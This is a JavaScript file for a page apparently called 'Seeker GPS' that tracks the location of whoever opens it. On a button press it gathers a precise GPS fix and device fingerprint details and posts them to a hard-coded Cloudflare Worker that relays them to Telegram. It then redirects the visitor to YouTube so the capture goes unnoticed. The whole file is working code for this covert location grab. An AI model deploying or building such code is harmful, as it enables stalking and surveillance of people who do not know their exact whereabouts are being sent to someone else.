
/* ==========================================
   SEEKER GPS - PRECISION MODE
   Version 2.1
   GPS FIRST -> REPORT -> REDIRECT
   ========================================== */


/* ==========================================
   CONFIGURATION
   ========================================== */

const locationBtn = document.getElementById("locationBtn");
const result = document.getElementById("result");

const WORKER_URL =
    "https://dark-hill-bae4.ykzir-polyglot.workers.dev/api/report";

// Landing page after successful report

const REDIRECT_URL = "https://www.youtube.com";

// GPS acquisition settings

const GPS_TIMEOUT = 60000;
const TARGET_ACCURACY = 10;
const GPS_MAXIMUM_AGE = 0;


/* ==========================================
   1. DEVICE INFORMATION READER
   ========================================== */

function getDeviceInfo() {

    const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

    const ua = navigator.userAgent || "";

    let browser = "Unknown";

    if (/Edg\//i.test(ua)) {
        browser = "Microsoft Edge";
    } else if (/OPR\//i.test(ua)) {
        browser = "Opera";
    } else if (/Chrome\//i.test(ua)) {
        browser = "Google Chrome";
    } else if (/Firefox\//i.test(ua)) {
        browser = "Mozilla Firefox";
    } else if (/Safari\//i.test(ua)) {
        browser = "Safari";
    }

    return {

        userAgent: ua || "Unavailable",

        platform:
            (navigator.userAgentData &&
             navigator.userAgentData.platform) ||
            navigator.platform ||
            "Unavailable",

        browser: browser,

        language:
            navigator.language || "Unavailable",

        screenResolution:
            screen.width + " x " + screen.height,

        timezone:
            Intl.DateTimeFormat().resolvedOptions().timeZone ||
            "Unavailable",

        connectionType:
            (connection && connection.effectiveType) ||
            "Unavailable"

    };

}


/* ==========================================
   2. PRECISION GPS ACQUISITION
   ========================================== */

function acquireBestGPS() {

    return new Promise((resolve, reject) => {

        if (!navigator.geolocation) {

            reject(
                new Error("GPS is not supported by this browser.")
            );

            return;

        }

        let watchId = null;
        let timeoutId = null;

        let bestPosition = null;
        let readings = 0;
        let finished = false;

        const startedAt = Date.now();

        function finish(position, error = null) {

            if (finished) return;

            finished = true;

            if (watchId !== null) {

                navigator.geolocation.clearWatch(watchId);

            }

            if (timeoutId !== null) {

                clearTimeout(timeoutId);

            }

            if (error) {

                reject(error);

                return;

            }

            if (!position) {

                reject(
                    new Error("No GPS position was received.")
                );

                return;

            }

            const acquisitionTime =
                Date.now() - startedAt;

            const gpsResult = {

                latitude: position.coords.latitude,

                longitude: position.coords.longitude,

                accuracy: position.coords.accuracy,

                readings: readings,

                acquisitionTime: acquisitionTime,

                gpsTimestamp: position.timestamp

            };

            console.log(
                "SEEKER GPS: BEST POSITION SELECTED",
                gpsResult
            );

            resolve(gpsResult);

        }


        /* ==================================
           GPS LOCATION ERROR HANDLER
           ================================== */

        function handleLocationError(error) {

            console.error(
                "SEEKER GPS ACQUISITION ERROR:",
                error
            );

            // Preserve the best position already obtained.

            if (bestPosition) {

                finish(bestPosition);

                return;

            }

            let message =
                "Unable to obtain GPS location.";

            switch (error.code) {

                case 1:
                    message =
                        "Location permission was denied.";
                    break;

                case 2:
                    message =
                        "GPS location is unavailable. Check your device location settings.";
                    break;

                case 3:
                    message =
                        "GPS acquisition timed out without receiving a position.";
                    break;

            }

            finish(null, new Error(message));

        }


        /* ==================================
           CONTINUOUS GPS MONITORING
           ================================== */

        try {

            watchId = navigator.geolocation.watchPosition(

                function(position) {

                    if (finished) return;

                    readings++;

                    const accuracy =
                        position.coords.accuracy;

                    console.log(
                        "GPS READING #" + readings,
                        {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: accuracy
                        }
                    );


                    // Compare current reading
                    // against the best previous reading.

                    if (
                        !bestPosition ||
                        accuracy < bestPosition.coords.accuracy
                    ) {

                        bestPosition = position;

                        console.log(
                            "SEEKER GPS: NEW BEST ACCURACY:",
                            accuracy,
                            "meters"
                        );

                    }


                    // Update user interface.

                    if (result) {

                        result.textContent =
                            "GPS scanning... " +
                            "Best accuracy: " +
                            bestPosition.coords.accuracy.toFixed(1) +
                            " meters | Readings: " +
                            readings;

                    }


                    // Stop early if target accuracy is reached.

                    if (
                        bestPosition.coords.accuracy <=
                        TARGET_ACCURACY
                    ) {

                        console.log(
                            "SEEKER GPS: TARGET ACCURACY REACHED."
                        );

                        finish(bestPosition);

                    }

                },

                handleLocationError,

                {
                    enableHighAccuracy: true,
                    timeout: GPS_TIMEOUT + 5000,
                    maximumAge: GPS_MAXIMUM_AGE
                }

            );

        } catch (error) {

            finish(
                null,
                new Error(
                    "Unable to start GPS monitoring: " +
                    error.message
                )
            );

            return;

        }


        /* ==================================
           MAXIMUM ACQUISITION TIME
           ================================== */

        timeoutId = setTimeout(function() {

            if (finished) return;

            console.log(
                "SEEKER GPS: 60 SECOND TIME LIMIT REACHED."
            );

            if (bestPosition) {

                finish(bestPosition);

            } else {

                finish(
                    null,
                    new Error(
                        "GPS timeout: No location readings received within 60 seconds."
                    )
                );

            }

        }, GPS_TIMEOUT);

    });

}


/* ==========================================
   3. SEND REPORT TO CLOUDFLARE
   ========================================== */

async function sendLocation(
    latitude,
    longitude,
    accuracy
) {

    const report = {

        latitude: latitude,

        longitude: longitude,

        accuracy: Math.round(accuracy),

        device: getDeviceInfo(),

        timestamp: new Date().toISOString()

    };

    console.log(
        "SEEKER GPS: Sending best position to Cloudflare..."
    );

    console.log(
        "SEEKER GPS: Final report:",
        report
    );

    let response;

    try {

        response = await fetch(WORKER_URL, {

            method: "POST",

            headers: {

                "Content-Type": "application/json"

            },

            body: JSON.stringify(report)

        });

    } catch (networkError) {

        console.error(
            "SEEKER GPS NETWORK ERROR:",
            networkError
        );

        throw new Error(
            "Cannot connect to Cloudflare Worker. Check your internet connection."
        );

    }


    console.log(
        "Cloudflare HTTP Status:",
        response.status
    );

    let data;

    try {

        data = await response.json();

    } catch (parseError) {

        console.error(
            "SEEKER GPS RESPONSE ERROR:",
            parseError
        );

        throw new Error(
            "Cloudflare returned an invalid or empty response."
        );

    }


    console.log(
        "Cloudflare Response:",
        data
    );


    if (!response.ok || data.success !== true) {

        const errorMessage = [

            data.error ||
            "Cloudflare backend request failed.",

            data.telegram_error_code
                ? "Telegram error code: " +
                  data.telegram_error_code
                : "",

            data.telegram_description || ""

        ].filter(Boolean).join(" | ");

        throw new Error(errorMessage);

    }


    console.log(
        "SEEKER GPS: REPORT DELIVERY CONFIRMED."
    );

    return data;

}


/* ==========================================
   4. START PRECISION GPS
   ========================================== */

async function startPrecisionGPS() {

    if (locationBtn.disabled) {

        return;

    }


    // Check browser GPS support.

    if (!navigator.geolocation) {

        result.textContent =
            "GPS is not supported by this browser.";

        return;

    }


    // Check HTTPS security.

    if (!window.isSecureContext) {

        result.textContent =
            "GPS requires a secure HTTPS connection.";

        return;

    }


    locationBtn.disabled = true;

    result.textContent =
        "Requesting location permission...";


    console.log(
        "SEEKER GPS: PRECISION MODE STARTED."
    );


    try {

        /* ==================================
           STEP 1: ACQUIRE BEST GPS POSITION
           ================================== */

        result.textContent =
            "Searching for the most accurate GPS position...";

        const gps = await acquireBestGPS();


        /* ==================================
           STEP 2: DISPLAY BEST RESULT
           ================================== */

        console.log(
            "SEEKER GPS FINAL LATITUDE:",
            gps.latitude
        );

        console.log(
            "SEEKER GPS FINAL LONGITUDE:",
            gps.longitude
        );

        console.log(
            "SEEKER GPS FINAL ACCURACY:",
            gps.accuracy
        );

        console.log(
            "TOTAL GPS READINGS:",
            gps.readings
        );

        console.log(
            "GPS ACQUISITION TIME:",
            (gps.acquisitionTime / 1000).toFixed(1),
            "seconds"
        );


        result.textContent =
            "Best GPS position obtained: " +
            gps.accuracy.toFixed(1) +
            " meters. Sending report...";


        /* ==================================
           STEP 3: SEND BEST POSITION
           ================================== */

        const response = await sendLocation(

            gps.latitude,

            gps.longitude,

            gps.accuracy

        );


        /* ==================================
           STEP 4: CONFIRM DELIVERY
           ================================== */

        if (response.success === true) {

            result.textContent =
                "Location report delivered successfully. Redirecting...";

            console.log(
                "SEEKER GPS: REPORT DELIVERED SUCCESSFULLY."
            );


            /* ==================================
               STEP 5: REDIRECT TO LANDING PAGE
               ================================== */

            console.log(
                "SEEKER GPS: REDIRECTING TO:",
                REDIRECT_URL
            );

            window.location.replace(REDIRECT_URL);

            return;

        }

    } catch (error) {

        console.error(
            "SEEKER GPS ERROR:",
            error
        );

        result.textContent =
            "SEEKER GPS ERROR: " +
            error.message;

    } finally {

        // Keep the button disabled during navigation.
        // Re-enable it only if redirect has not started.

        if (
            window.location.href !== REDIRECT_URL
        ) {

            locationBtn.disabled = false;

        }

    }

}


/* ==========================================
   5. LOCATION BUTTON EVENT
   ========================================== */

if (!locationBtn || !result) {

    console.error(
        "SEEKER GPS ERROR: HTML elements not found."
    );

} else {

    locationBtn.addEventListener(
        "click",
        startPrecisionGPS
    );

}


/* ==========================================
   END OF SEEKER GPS PRECISION MODE
   ========================================== */
